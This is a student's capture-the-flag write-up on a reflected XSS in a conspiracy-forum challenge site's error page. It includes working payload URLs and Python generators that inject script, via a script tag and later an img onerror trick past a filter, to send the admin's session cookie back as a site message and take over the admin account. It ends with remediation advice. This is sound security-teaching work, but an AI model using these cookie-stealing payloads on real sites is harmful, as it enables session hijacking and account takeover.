**Name:** flofriday

**Points:** Not yet graded

<hr>

# Obxssession

## Overview

The webapp [obxssession](https://obxssession.hackthe.space/) is a forum, for conspiracy theories. Users can also
log in and send each other messages.

## Vulnerability

There is a Reflected XSS vulnerability at the `/error` route, where the values of the query-parameters `m` and `p` get reflected without being properly sanitized first.

## Exploitation

During the exploitation I was on a Discord call with █████, █████ and █████, we explored the challenge together and discussed approaches created our payload on our own and never shared the flag.

First, I created an account on the target website and logged in (no email verification required). Suprised that the login worked at all and is not just a placeholder, we figured out that the website uses a cookie, which hasn't the `HttpOnly` flag set, which makes it possible to be readable from Javascript.

Once logged in I figured out that I could send myself messages, so I tried to trigger an XSS vulnerability by sending myself messages like the following, but they all were sanitized correctly.

```html
Is <b>this</b> bold?
```

After a **long** time, I found that the redacted forum post is on a special error page and that the error messages are not only inside the html page but also in the URL as query parameters. Upon that discovery, I tried the following url `https://obxssession.hackthe.space/error?m=%3Cscript%3Ealert(%22flotschi%22)%3C/script%3E&p=/theory/5`.

And the script worked, I finally had an working XSS vulnerability. The nex step is to steal the session cookie and automatically send ourself a message The former can be quite easily done with `document.cookie`.

To send messages we can open the [Network Monitor]((https://developer.mozilla.org/en-US/docs/Tools/Network_Monitor) in the [Firefox Developer Tools](https://developer.mozilla.org/en-US/docs/Tools). Now we send ourself a message from the WebUI, and then search for the last `POST` request in the log. Once we found the request we can rightclick -> Copy -> Copy as Fetch, and after some cleaning up (removing not necessary parameters) we receive the follwing  Javascript:

```javascript
await fetch("https://obxssession.hackthe.space/send", {
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "receiver=9&subject=Hi+handsome&contents=Flotschi+was+here+",
  method: "POST",
});
```

Unfortunatly, we cannot just paste this script into the URL as, we cannot have `&` (ampersand signs) in our payload which means we first need to escape them properly. So for this I worte myself a little [Python](https://www.python.org/) script inside a [Jupyter Notebook](https://jupyter.org/).

```python
import urllib.parse
script = """
fetch("https://obxssession.hackthe.space/send", {
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "receiver=9&subject=Hi+handsome&contents="+document.cookie,
  method: "POST",
});
"""
script = script.replace('\n', '').replace(' ', '')
url = "https://obxssession.hackthe.space/error?m=Flotschi&p=<script>"  + urllib.parse.quote(script) + "</script>"
print(url)
```

In this script, the generated url already steals the cookie.

After testing the above script and successfully sending myself my own cookie, I tried to send the URL to the admin, however upon submission I got the warning: "Whoa there, are you trying to hack somebody?".

Some messages later, I figured out that the `script` tag gets detected, so I tried to rewrite the exploit to use the `onerror` attribute of the `img` tag (This method works as we can set an empty src attribute on the image which will always cause the onerror to trigger).

Since the Javascript is now in an HTML attribute, we can no longer use  double quotes inside our Javascript as this would end the attribute, so we need to replace them with single quotes.

The final script now looked like this:

```python
import urllib.parse
script = """
fetch("https://obxssession.hackthe.space/send", {
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "receiver=9&subject=Hi+handsome&contents="+document.cookie,
  method: "POST",
});
"""
script = script.replace('"', '\'').replace('\n', '').replace(' ', '')
url = 'https://obxssession.hackthe.space/error?m=Flotschi&p=<img%20src=""%20onerror="'  + urllib.parse.quote(script) + '">'
print(url)
```

Sending the resulting link to the admin, worked without any further warnin and almost instantly I received a response from the admin with their cookie. Next we go to [Firefox Devloper Tools]([Firefox Developer Tools | MDN](https://developer.mozilla.org/en-US/docs/Tools)) -> Storage -> Cookies and then copy the admins cookie into the value field.

After a quick reload we see in the header that we are now logged in as th admin and when we navigate to the profile page, we can see the flag.

## Solution

First, the best solution is to close the XSS vulnerability, this should be quite easy as the website already sanitizes the messeages properly and just has to apply the same technique to the query parameters of the error page.

Next, I would also set the `HttpOnly` flag on the session cookie, so that XSS vulnerabilities in the future cannot steal the cookie that easily (also I would set the `Secure` flag, this hasn't affected my ability to steal the cookie but is just best-practise).

We can further improve the security of the website by telling the browser that only Javascript files from the same origin are allowed, which does not include inline scripts.

```
Content-Security-Policy: script-src 'self';
```
